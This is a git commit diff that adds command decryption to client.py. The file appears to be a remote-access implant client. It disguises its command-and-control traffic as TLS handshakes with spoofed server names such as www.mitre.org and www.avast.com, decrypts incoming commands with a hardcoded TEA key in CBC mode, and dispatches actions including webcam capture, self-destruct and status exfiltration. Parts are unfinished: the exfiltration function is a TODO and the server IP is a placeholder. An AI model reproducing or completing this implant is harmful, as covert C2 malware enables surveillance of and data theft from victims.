70c6b9849b171a5f7ee71189183e247e6b588552
userazhao <89986648+userazhao@users.noreply.github.com>
2023-05-13 13:49:30 -0400

    Update client.py
    add command decryption

--- client.py
+++ client.py
@@ -5,11 +5,61 @@ from socket import *
 import cv2
 import pyautogui
 
+K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
+magic = 0x9e3779b9
 
-def parsecmd(enccmd): # TODO
-    ct = "" # command type
-    cp = "" # command parameter
-    return (ct, cp)
+def decrypt(ciphertext: list[int]) -> list[int]:
+    L = ciphertext[0]
+    R = ciphertext[1]
+    sum = magic << 5
+    for x in range(0,32):
+        R -= ((L << 4) + K[2]) ^ (L + sum) ^ ((L >> 5) + K[3])
+        L -= ((R << 4) + K[0]) ^ (R + sum) ^ ((R >> 5) + K[1])
+        sum -= magic
+    return [L, R]
+
+def arrtoint(ints: list[int]) -> int:
+    hexs = [hex(int)[2:].rjust(2,"0") for int in ints]
+    hexn = "".join(hexs)
+    return int(hexn, 16)
+
+def matrxor(matr1: list[int], matr2: list[int]) -> list[int]:
+    out = []
+    for x in range(0,2):
+        out.append(matr1[x] ^ matr2[x])
+    return out
+
+def fromint(ints: list[int]) -> str:
+    L = ""
+    R = ""
+    for x in range(0,4):
+        L = chr(ints[0] // pow(256,x)) + L
+        R = chr(ints[1] // pow(256,x)) + R
+    return L + R
+
+def cbc(ciphertext: bytes) -> str:
+    plain = []
+    arr = list(ciphertext)
+    blockarr = []
+    for x in range(0,9):
+        blockarr.append([arrtoint(arr[4*x:4*x+4]), arrtoint(arr[4*x+4:4*x+8])])
+    for x in range(1,9):
+        prexor = decrypt(blockarr[x])
+        plain.append(matrxor(prexor, blockarr[x-1]))
+    out = ""
+    for x in range(0,8):
+        out += fromint(plain[x])
+    return out
+
+def parsecmd(enccmd: bytes):
+    cmd = cbc(enccmd)
+    cmdarr = cmd.split("|")
+    ct = cmdarr[0] # command type
+    if len(cmdarr) > 1:
+        cp = cmdarr[1] # command parameter
+    else:
+        cp = ""
+    return [ct, cp]
 
 def execcmd(cmd):
     ct = cmd[0]
@@ -26,7 +76,7 @@ def execcmd(cmd):
         cam()
     elif ct == "sd": # self destruct
         sd()
-    elif ct == "stat":
+    elif ct == "stat": # exfiltrate status
         exfil("1")
     else:
         exfil("0")
@@ -67,7 +117,13 @@ def exfil(info): # TODO
 ip = "1"
 port = 443
 
-def makehello():
+def makerandbytes(length: int) -> list[int]:
+    out = []
+    for x in range(0,length):
+        out.append(random.randint(0,255))
+    return out
+
+def makehello() -> list[int]:
     servernames = [
         "www.mitre.org", "www.amazon.com",
         "www.avast.com", "www.apple.com",
@@ -85,8 +141,8 @@ def makehello():
         0x00, 0x00,
         0x00, servname_s + 5,
         0x00, servname_s + 3,
-        0x00,
-        0x00, servname_s
+        0x00, 0x00,
+        servname_s
     ]
 
     extserv = extserv_pre + servname
@@ -107,18 +163,13 @@ def makehello():
         0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
         0xd2, 0xcd, 0x16, 0x62, 0x54
     ]
-    extoth_p2 = []
-    for x in range(0,32):
-        extoth_p2.append(random.randbytes(1))
+    extoth_p2 = makerandbytes(32)
     extoth = extoth_p1 + extoth_p2
 
     ext = extserv + extoth
 
-    cvel_r1 = []
-    cvel_r2 = []
-    for x in range(0,32):
-        cvel_r1.append(random.randbytes(1))
-        cvel_r2.append(random.randbytes(1))
+    cvel_r1 = makerandbytes(32)
+    cvel_r2 = makerandbytes(32)
     
     cvel_p1 = [
         0x03, 0x03
@@ -127,7 +178,8 @@ def makehello():
         0x20
     ]
     cvel_p3 = [
-        0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00, len(ext)
+        0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff,
+        0x01, 0x00, 0x00, len(ext)
     ]
     cvel = cvel_p1 + cvel_r1 + cvel_p2 + cvel_r2 + cvel_p3
 
@@ -135,10 +187,11 @@ def makehello():
     cvrest_s = len(cvrest)
 
     top = [
-        0x16, 0x03, 0x01,
-        0x00, cvrest_s + 4,
+        0x16, 0x03,
         0x01, 0x00,
-        0x00, cvrest_s
+        cvrest_s + 4, 0x01,
+        0x00, 0x00,
+        cvrest_s
     ]
 
     clihel = top + cvrest
@@ -146,19 +199,17 @@ def makehello():
 
 def sendhello(clientSocket):
     clihel = makehello()
-    clientSocket.send(clihel)
+    clientSocket.send(bytes(clihel))
 
 def sendhellofin(clientSocket):
     clihelfin_p1 = [
-        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03,
-        0x03, 0x00, 0x45
+        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03, 0x03, 0x00,
+        0x45
     ]
-    clihelfin_p2 = []
-    for x in range(0,69):
-        clihelfin_p2.append(random.randbytes(1))
+    clihelfin_p2 = makerandbytes(69)
     clihelfin = clihelfin_p1 + clihelfin_p2
 
-    clientSocket.send(clihelfin)
+    clientSocket.send(bytes(clihelfin))
 
 def main():
     clientSocket = socket(AF_INET, SOCK_STREAM)
